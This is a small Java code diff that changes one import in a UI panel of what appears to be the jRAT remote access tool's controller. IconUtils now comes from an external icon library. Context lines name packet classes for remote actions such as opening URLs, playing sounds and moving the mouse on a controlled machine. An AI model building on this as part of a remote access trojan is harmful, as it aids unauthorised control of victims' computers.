@@ -1,5 +1,7 @@
 package se.jrat.controller.ui.panels;
 
+import iconlib.IconUtils;
+
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 
@@ -20,7 +22,6 @@ import se.jrat.controller.packets.outgoing.Packet39VisitManyURLs;
 import se.jrat.controller.packets.outgoing.Packet44PlaySoundFromURL;
 import se.jrat.controller.packets.outgoing.Packet46CrazyMouse;
 import se.jrat.controller.packets.outgoing.Packet65Beep;
-import se.jrat.controller.utils.IconUtils;
 import se.jrat.controller.utils.NetUtils;
 
 
